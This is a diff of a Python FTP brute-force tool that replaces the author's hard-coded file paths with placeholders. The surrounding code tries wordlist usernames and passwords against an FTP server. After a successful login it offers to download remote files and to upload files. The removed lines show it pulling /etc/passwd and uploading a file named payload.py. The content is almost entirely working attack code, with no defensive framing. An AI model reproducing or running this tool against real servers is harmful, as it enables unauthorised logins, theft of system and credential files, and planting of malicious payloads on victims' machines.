@@ -18,9 +18,9 @@ def main():
             ftp = ftplib.FTP()
             port = input("Enter the port: ")
             # Select the file with potential logins or usernames.
-            file_usernames = open("/home/skinnygoat/usernames.txt", "r+")
+            file_usernames = open("...Put the path to your file...", "r+")
             # Select the file with potential passwords.
-            file_passwords = open("/home/skinnygoat/passwords.txt", "r+")
+            file_passwords = open("...Put the path to your file...", "r+")
 
             usernames = file_usernames.read().split("\n")
             passwords = file_passwords.read().split("\n")
@@ -49,13 +49,13 @@ def main():
                             if choice == "1":
                                 print(f"\n[+] Trying to download the file...\n")
                                 # In my case it will be /etc/passwd. You can download whatever you want.
-                                ftp.retrbinary("RETR /etc/passwd", open("/home/skinnygoat/passwd.txt", "wb").write)
+                                ftp.retrbinary("RETR ...Path to downloading file...", open("...Path to save downloaded file...", "wb").write)
                                 print(f"[+] Successfully downloaded!\n")
 
                             elif choice == "2":
                                 print(f"\n[+] Trying to send the file...\n")
                                 # Send the file of your choice.
-                                ftp.storbinary("STOR payload.py", open("/home/skinnygoat/payload.py", "rb"))
+                                ftp.storbinary("STOR ...Path to sending file...", open("...Path to save sent file...", "rb"))
                                 print(f"[+] Successfully sent!\n")
 
                             elif choice == "3":
